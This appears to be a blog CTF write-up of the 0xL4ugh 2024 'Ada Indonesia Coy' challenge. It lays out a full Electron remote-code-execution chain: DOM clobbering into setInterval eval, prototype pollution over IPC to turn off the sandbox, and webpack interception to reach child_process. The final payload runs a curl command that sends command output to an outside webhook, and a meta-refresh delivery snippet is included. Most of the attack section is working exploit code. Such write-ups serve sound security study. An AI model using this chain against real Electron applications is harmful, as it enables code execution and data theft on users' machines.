<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content="width=device-width"><title>2024 0xL4ugh CTF - Ada Indonesia Coy ðŸ‡®ðŸ‡© | circleous</title><link rel=stylesheet href=/css/main.min.480e0ef6c6aac53eaf38419259058419b9323d67397f61cf2d8ce892d869c560.css integrity="sha256-SA4O9saqxT6vOEGSWQWEGbkyPWc5f2HPLYzokthpxWA=" crossorigin=anonymous><link rel=stylesheet href=/css/codes.min.212a1080bdb9f68724a4aff8ef71b5bf08e662a8f5ef70b13d4d94330d804899.css integrity="sha256-ISoQgL259ockpK/473G1vwjmYqj173CxPU2UMw2ASJk=" crossorigin=anonymous><link rel=icon type=image/svg+xml href=/favicon.svg></head><body><header><h1><a href=/>circleous</a></h1><nav><ul><li><a href=/>Home</a></li><li><a aria-current=true class=ancestor href=/posts/>Posts</a></li><li><a href=/tags/>Tags</a></li></ul></nav></header><main><article><header><h1>2024 0xL4ugh CTF - Ada Indonesia Coy ðŸ‡®ðŸ‡©</h1><time datetime=2024-12-29T00:00:00+07:00>December 29, 2024</time></header><h2 id=introduction>Introduction</h2><p>This writeup covers the &ldquo;Ada Indonesia Coy&rdquo; challenge from the 0xL4ugh CTF 2024. The challenge presents an Electron application with multiple security vulnerabilities that can be chained together to achieve Remote Code Execution (RCE). The exploit path demonstrates several advanced techniques including DOM clobbering, prototype pollution via IPC, and Electron&rsquo;s webpack module interception.</p><h2 id=challenge-setup-and-configuration>Challenge Setup and Configuration</h2><p>The Electron application is configured with the following critical security settings in the <code>BrowserWindow</code> initialization:</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span>webPreferences<span style=color:#9ece6a;font-weight:700>:</span> {
</span></span><span style=display:flex><span>  preload<span style=color:#9ece6a;font-weight:700>:</span> path.join(__dirname, <span style=color:#9ece6a>&#34;./preload.js&#34;</span>),
</span></span><span style=display:flex><span>  nodeIntegration<span style=color:#9ece6a;font-weight:700>:</span> <span style=color:#e0af68>false</span>,
</span></span><span style=display:flex><span>  contextIsolation<span style=color:#9ece6a;font-weight:700>:</span> <span style=color:#e0af68>false</span>,
</span></span><span style=display:flex><span>},
</span></span></code></pre></div><p>These settings create a specific security posture:</p><ul><li><strong><code>nodeIntegration: false</code></strong> - The renderer process cannot directly access Node.js APIs</li><li><strong><code>contextIsolation: false</code></strong> - The preload script, renderer process, and Electron internals share the same JavaScript context</li></ul><p>The combination of <code>nodeIntegration: false</code> and <code>contextIsolation: false</code> creates an interesting attack surface: while direct Node.js access is blocked, the shared JavaScript context allows for sophisticated context manipulation attacks.</p><h2 id=vulnerability-analysis>Vulnerability Analysis</h2><h3 id=1-dom-clobbering-xss-in-note-display>1. DOM Clobbering XSS in Note Display</h3><p>The application uses a function to display notes in iframes that contains a critical DOM clobbering vulnerability:</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#bb9af7>async</span> <span style=color:#9d7cd8>function</span> createNoteFrame(html, time) {
</span></span><span style=display:flex><span>    <span style=color:#bb9af7>const</span> note <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#9ece6a>document</span>.createElement(<span style=color:#9ece6a>&#34;iframe&#34;</span>)
</span></span><span style=display:flex><span>    note.frameBorder <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>false</span>
</span></span><span style=display:flex><span>    note.height <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#9ece6a>&#34;250px&#34;</span>
</span></span><span style=display:flex><span>    note.srcdoc <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#9ece6a>&#34;&lt;dialog id=&#39;dialog&#39;&gt;&#34;</span> <span style=color:#9ece6a;font-weight:700>+</span> html <span style=color:#9ece6a;font-weight:700>+</span> <span style=color:#9ece6a>&#34;&lt;/dialog&gt;&#34;</span>
</span></span><span style=display:flex><span>    note.sandbox <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#9ece6a>&#39;allow-same-origin&#39;</span>
</span></span><span style=display:flex><span>    note.onload <span style=color:#9ece6a;font-weight:700>=</span> (ev) =&gt; {
</span></span><span style=display:flex><span>        <span style=color:#bb9af7>const</span> dialog <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#bb9af7>new</span> <span style=color:#9ece6a>Proxy</span>(ev.target.contentWindow.dialog, {
</span></span><span style=display:flex><span>            get<span style=color:#9ece6a;font-weight:700>:</span> (target, prop) =&gt; {
</span></span><span style=display:flex><span>                <span style=color:#bb9af7>const</span> res <span style=color:#9ece6a;font-weight:700>=</span> target[prop];
</span></span><span style=display:flex><span>                <span style=color:#bb9af7>return</span> <span style=color:#bb9af7>typeof</span> res <span style=color:#9ece6a;font-weight:700>===</span> <span style=color:#9ece6a>&#34;function&#34;</span> <span style=color:#9ece6a;font-weight:700>?</span> res.bind(target) <span style=color:#9ece6a;font-weight:700>:</span> res;
</span></span><span style=display:flex><span>            },
</span></span><span style=display:flex><span>        })
</span></span><span style=display:flex><span>        setInterval(dialog.close, time <span style=color:#9ece6a;font-weight:700>/</span> <span style=color:#e0af68>2</span>);
</span></span><span style=display:flex><span>        setInterval(dialog.showModal, time);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#bb9af7>return</span> note
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#bb9af7>const</span> mynote <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#bb9af7>await</span> createNoteFrame(<span style=color:#9ece6a>&#34;&lt;h1&gt;Hati Hati!&lt;/h1&gt;&lt;p&gt;Website &#34;</span> <span style=color:#9ece6a;font-weight:700>+</span> <span style=color:#9ece6a>decodeURIComponent</span>(<span style=color:#9ece6a>document</span>.location) <span style=color:#9ece6a;font-weight:700>+</span> <span style=color:#9ece6a>&#34; Kemungkinan Berbahaya!&lt;/p&gt;&#34;</span>, <span style=color:#e0af68>1000</span>)
</span></span></code></pre></div><p><strong>Vulnerability Details:</strong>
The <code>setInterval()</code> function accepts a string as its first argument, which gets evaluated as JavaScript when passed. By using DOM clobbering to override the <code>dialog</code> object, we can inject arbitrary JavaScript that executes when <code>setInterval()</code> calls <code>dialog.close</code> or <code>dialog.showModal</code>.</p><p><strong>DOM Clobbering Payload:</strong></p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#bb9af7>a</span> <span style=color:#7aa2f7>id</span><span style=color:#9ece6a;font-weight:700>=</span><span style=color:#9ece6a>dialog</span> <span style=color:#7aa2f7>name</span><span style=color:#9ece6a;font-weight:700>=</span><span style=color:#9ece6a>close</span> <span style=color:#7aa2f7>href</span><span style=color:#9ece6a;font-weight:700>=</span><span style=color:#9ece6a>&#34;foo:console.log(1337)&#34;</span>&gt;
</span></span></code></pre></div><p>When this payload is processed, <code>setInterval(dialog.close, time / 2)</code> becomes equivalent to <code>setInterval("console.log(1337)", time / 2)</code>, executing our JavaScript code.</p><h3 id=2-prototype-pollution-via-ipc-communication>2. Prototype Pollution via IPC Communication</h3><p>The application exposes three IPC handlers through the preload script:</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#414868;font-style:italic>// main.js
</span></span></span><span style=display:flex><span>ipcMain.handle(<span style=color:#9ece6a>&#34;set-config&#34;</span>, (_, conf, obj) =&gt; {
</span></span><span style=display:flex><span>  <span style=color:#9ece6a>Object</span>.assign(config[conf], obj)
</span></span><span style=display:flex><span>})
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>ipcMain.handle(<span style=color:#9ece6a>&#34;get-config&#34;</span>, (_) =&gt; {
</span></span><span style=display:flex><span>  <span style=color:#bb9af7>return</span> config
</span></span><span style=display:flex><span>})
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>ipcMain.handle(<span style=color:#9ece6a>&#34;get-window&#34;</span>, (_) =&gt; {
</span></span><span style=display:flex><span>  <span style=color:#bb9af7>const</span> win <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#bb9af7>new</span> BrowserWindow({
</span></span><span style=display:flex><span>    width<span style=color:#9ece6a;font-weight:700>:</span> <span style=color:#e0af68>800</span>,
</span></span><span style=display:flex><span>    height<span style=color:#9ece6a;font-weight:700>:</span> <span style=color:#e0af68>600</span>,
</span></span><span style=display:flex><span>    parent<span style=color:#9ece6a;font-weight:700>:</span> mainWindow,
</span></span><span style=display:flex><span>    webPreferences<span style=color:#9ece6a;font-weight:700>:</span> {
</span></span><span style=display:flex><span>      preload<span style=color:#9ece6a;font-weight:700>:</span> path.join(__dirname, <span style=color:#9ece6a>&#39;preload.js&#39;</span>),
</span></span><span style=display:flex><span>      nodeIntegration<span style=color:#9ece6a;font-weight:700>:</span> <span style=color:#e0af68>false</span>,
</span></span><span style=display:flex><span>      contextIsolation<span style=color:#9ece6a;font-weight:700>:</span> <span style=color:#e0af68>false</span>,
</span></span><span style=display:flex><span>    },
</span></span><span style=display:flex><span>    fullscreen<span style=color:#9ece6a;font-weight:700>:</span> <span style=color:#e0af68>false</span>,
</span></span><span style=display:flex><span>  })
</span></span><span style=display:flex><span>  win.loadFile(<span style=color:#9ece6a>&#34;./ada-indonesia-coy/index.html&#34;</span>)
</span></span><span style=display:flex><span>})
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic>// preload.js
</span></span></span><span style=display:flex><span><span style=color:#bb9af7>class</span> api {
</span></span><span style=display:flex><span>    getConfig(){
</span></span><span style=display:flex><span>        <span style=color:#bb9af7>return</span> electron.ipcRenderer.invoke(<span style=color:#9ece6a>&#34;get-config&#34;</span>)
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    setConfig(conf, obj){
</span></span><span style=display:flex><span>        <span style=color:#bb9af7>return</span> electron.ipcRenderer.invoke(<span style=color:#9ece6a>&#34;set-config&#34;</span>, conf, obj)
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#9ece6a>window</span>(){
</span></span><span style=display:flex><span>        <span style=color:#bb9af7>return</span> electron.ipcRenderer.invoke(<span style=color:#9ece6a>&#34;get-window&#34;</span>)
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#9ece6a>window</span>.api <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#bb9af7>new</span> api()
</span></span></code></pre></div><p><strong>Vulnerability Details:</strong>
The <code>set-config</code> IPC handler uses <code>Object.assign(config[conf], obj)</code> without any validation, allowing prototype pollution by targeting <code>config.__proto__</code>. This technique can override default Electron configuration values for newly created <code>BrowserWindow</code> instances.</p><p><strong>Exploitation:</strong></p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span>api.setConfig(<span style=color:#9ece6a>&#34;__proto__&#34;</span>, {sandbox<span style=color:#9ece6a;font-weight:700>:</span> <span style=color:#e0af68>false</span>})
</span></span><span style=display:flex><span>api.<span style=color:#9ece6a>window</span>()
</span></span></code></pre></div><p>This pollutes the prototype chain to set <code>sandbox: false</code>, causing subsequently created <code>BrowserWindow</code> instances to launch with the <code>--no-sandbox</code> flag:</p><pre tabindex=0><code># Normal process
--enable-sandbox

# Polluted process  
--no-sandbox
--no-zygote
</code></pre><h3 id=3-webpack-module-exposure-via-context-manipulation>3. Webpack Module Exposure via Context Manipulation</h3><p>Since the <code>BrowserWindow</code> runs with <code>contextIsolation: false</code>, we can manipulate the shared JavaScript context to expose Node.js modules. Electron internally uses webpack for module loading, which performs lazy loading of internal modules like <code>ipcRenderer</code>.</p><p><strong>Interception Technique:</strong></p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#9ece6a>window</span>.copyOfIpcRenderer <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>null</span>;
</span></span><span style=display:flex><span><span style=color:#9ece6a>Object</span>.defineProperty(<span style=color:#9ece6a>Object</span>.prototype, <span style=color:#9ece6a>`./lib/renderer/api/ipc-renderer.ts`</span>, {
</span></span><span style=display:flex><span>  set(v) {
</span></span><span style=display:flex><span>    <span style=color:#9ece6a>window</span>.copyOfIpcRenderer <span style=color:#9ece6a;font-weight:700>=</span> v;
</span></span><span style=display:flex><span>    <span style=color:#9ece6a>window</span>.module <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#bb9af7>this</span>.module;
</span></span><span style=display:flex><span>  },
</span></span><span style=display:flex><span>  get() {
</span></span><span style=display:flex><span>    <span style=color:#bb9af7>return</span> <span style=color:#9ece6a>window</span>.copyOfIpcRenderer;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>});
</span></span></code></pre></div><p><strong>How it Works:</strong>
Electron internally calls <code>__webpack_require__("./lib/renderer/api/ipc-renderer.ts")</code> to load the IPC renderer. Our property interceptor captures this moment and copies the <code>this.module</code> object (which contains Node.js&rsquo;s <code>require</code> function) to our window context:</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#9d7cd8>function</span> __webpack_require__(r) {
</span></span><span style=display:flex><span>	<span style=color:#9d7cd8>var</span> n <span style=color:#9ece6a;font-weight:700>=</span> t[r];
</span></span><span style=display:flex><span>	<span style=color:#bb9af7>if</span> (<span style=color:#bb9af7>void</span> <span style=color:#e0af68>0</span> <span style=color:#9ece6a;font-weight:700>!==</span> n)
</span></span><span style=display:flex><span>		<span style=color:#bb9af7>return</span> n.exports;
</span></span><span style=display:flex><span>	<span style=color:#9d7cd8>var</span> i <span style=color:#9ece6a;font-weight:700>=</span> t[r] <span style=color:#9ece6a;font-weight:700>=</span> {
</span></span><span style=display:flex><span>		exports<span style=color:#9ece6a;font-weight:700>:</span> {}
</span></span><span style=display:flex><span>	};
</span></span><span style=display:flex><span>	<span style=color:#bb9af7>return</span> e[r](i, i.exports, __webpack_require__),
</span></span><span style=display:flex><span>	i.exports
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>This technique grants us access to Node.js modules, including <code>child_process</code> for RCE.</p><h2 id=attack-chain-assembly>Attack Chain Assembly</h2><p>The complete exploit chain follows these steps, each protected by sync guards to prevent multiple execution:</p><p><strong>Step 1: Webpack Interceptor Setup</strong></p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#bb9af7>if</span> (<span style=color:#9ece6a;font-weight:700>!</span><span style=color:#9ece6a>window</span>.SyncOnce) {
</span></span><span style=display:flex><span>  <span style=color:#9ece6a>window</span>.SyncOnce <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>true</span>;
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>  <span style=color:#9ece6a>window</span>.copyOfIpcRenderer <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>null</span>;
</span></span><span style=display:flex><span>  <span style=color:#9ece6a>Object</span>.defineProperty(<span style=color:#9ece6a>Object</span>.prototype, <span style=color:#9ece6a>`./lib/renderer/api/ipc-renderer.ts`</span>, {
</span></span><span style=display:flex><span>    set(v) {
</span></span><span style=display:flex><span>      <span style=color:#9ece6a>window</span>.copyOfIpcRenderer <span style=color:#9ece6a;font-weight:700>=</span> v;
</span></span><span style=display:flex><span>      <span style=color:#9ece6a>window</span>.module <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#bb9af7>this</span>.module;
</span></span><span style=display:flex><span>    },
</span></span><span style=display:flex><span>    get() {
</span></span><span style=display:flex><span>      <span style=color:#bb9af7>return</span> <span style=color:#9ece6a>window</span>.copyOfIpcRenderer;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  });
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p><strong>Step 2: Prototype Pollution for Sandbox Bypass</strong></p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#bb9af7>if</span> (<span style=color:#9ece6a;font-weight:700>!</span><span style=color:#9ece6a>window</span>.SyncOnce) {
</span></span><span style=display:flex><span>  <span style=color:#9ece6a>window</span>.SyncOnce <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>true</span>;
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>  <span style=color:#414868;font-style:italic>// Webpack interceptor from Step 1
</span></span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>  api.setConfig(<span style=color:#9ece6a>`__proto__`</span>, { sandbox<span style=color:#9ece6a;font-weight:700>:</span> <span style=color:#e0af68>false</span> });
</span></span><span style=display:flex><span>  api.<span style=color:#9ece6a>window</span>();
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>The new <code>BrowserWindow</code> inherits the same <code>document.location</code>, causing it to load the same malicious payload with our DOM clobbering attack.</p><p><strong>Step 3: Node.js Module Access and RCE</strong></p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#bb9af7>if</span> (<span style=color:#9ece6a>window</span>.module <span style=color:#9ece6a;font-weight:700>&amp;&amp;</span> <span style=color:#9ece6a;font-weight:700>!</span><span style=color:#9ece6a>window</span>.syncOnce2) {
</span></span><span style=display:flex><span>  <span style=color:#9ece6a>window</span>.syncOnce2 <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>true</span>;
</span></span><span style=display:flex><span>  <span style=color:#9ece6a>window</span>.module.exports._load(<span style=color:#9ece6a>`child_process`</span>).execSync(<span style=color:#9ece6a>`curl http://webhook -d flag=$(/readflag)`</span>);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><h2 id=final-exploit>Final Exploit</h2><p><strong>Complete Payload:</strong></p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#bb9af7>if</span> (<span style=color:#9ece6a;font-weight:700>!</span><span style=color:#9ece6a>window</span>.syncOnce) {
</span></span><span style=display:flex><span>  <span style=color:#9ece6a>window</span>.syncOnce <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>true</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#414868;font-style:italic>// Webpack module interception
</span></span></span><span style=display:flex><span>  <span style=color:#9ece6a>window</span>.copyOfIpcRenderer <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>null</span>;
</span></span><span style=display:flex><span>  <span style=color:#9ece6a>Object</span>.defineProperty(<span style=color:#9ece6a>Object</span>.prototype, <span style=color:#9ece6a>`./lib/renderer/api/ipc-renderer.ts`</span>, {
</span></span><span style=display:flex><span>    set(v) {
</span></span><span style=display:flex><span>      <span style=color:#9ece6a>window</span>.copyOfIpcRenderer <span style=color:#9ece6a;font-weight:700>=</span> v;
</span></span><span style=display:flex><span>      <span style=color:#9ece6a>window</span>.module <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#bb9af7>this</span>.module;
</span></span><span style=display:flex><span>    },
</span></span><span style=display:flex><span>    get() {
</span></span><span style=display:flex><span>      <span style=color:#bb9af7>return</span> <span style=color:#9ece6a>window</span>.copyOfIpcRenderer;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  });
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#414868;font-style:italic>// Prototype pollution for sandbox bypass
</span></span></span><span style=display:flex><span>  api.setConfig(<span style=color:#9ece6a>`__proto__`</span>, { sandbox<span style=color:#9ece6a;font-weight:700>:</span> <span style=color:#e0af68>false</span> });
</span></span><span style=display:flex><span>  api.<span style=color:#9ece6a>window</span>();
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic>// RCE execution after Node.js modules are exposed
</span></span></span><span style=display:flex><span><span style=color:#bb9af7>if</span> (<span style=color:#9ece6a>window</span>.module <span style=color:#9ece6a;font-weight:700>&amp;&amp;</span> <span style=color:#9ece6a;font-weight:700>!</span><span style=color:#9ece6a>window</span>.syncOnce2) {
</span></span><span style=display:flex><span>  <span style=color:#9ece6a>window</span>.syncOnce2 <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>true</span>;
</span></span><span style=display:flex><span>  <span style=color:#9ece6a>window</span>.module.exports._load(<span style=color:#9ece6a>`child_process`</span>).execSync(<span style=color:#9ece6a>`curl http://webhook -d flag=$(/readflag)`</span>);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p><strong>Payload Delivery via DOM Clobbering:</strong></p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#bb9af7>a</span> <span style=color:#7aa2f7>id</span><span style=color:#9ece6a;font-weight:700>=</span><span style=color:#9ece6a>dialog</span> <span style=color:#7aa2f7>name</span><span style=color:#9ece6a;font-weight:700>=</span><span style=color:#9ece6a>close</span> <span style=color:#7aa2f7>href</span><span style=color:#9ece6a;font-weight:700>=</span><span style=color:#9ece6a>&#34;foo:PAYLOAD&#34;</span>&gt;
</span></span></code></pre></div><p><strong>URL-Based Injection:</strong>
The payload can be delivered through URL manipulation using a meta refresh redirect:</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#bb9af7>meta</span> <span style=color:#7aa2f7>http-equiv</span><span style=color:#9ece6a;font-weight:700>=</span><span style=color:#9ece6a>&#34;refresh&#34;</span> <span style=color:#7aa2f7>content</span><span style=color:#9ece6a;font-weight:700>=</span><span style=color:#9ece6a>&#34;0; url=https://127.0.0.1:3000/#URL_ENCODED_DOM_CLOBBERING_PAYLOAD&#34;</span>&gt;
</span></span></code></pre></div><div><div>Tags:</div><ul><li><a href=/tags/ctf-writeup/>Ctf-Writeup</a></li><li><a href=/tags/electron/>Electron</a></li><li><a href=/tags/web/>Web</a></li></ul></div></article></main><footer><p>&copy; 2025 circleous. Licensed under <a href=https://creativecommons.org/publicdomain/zero/1.0/ target=_blank>CC0</a>.</p></footer></body></html>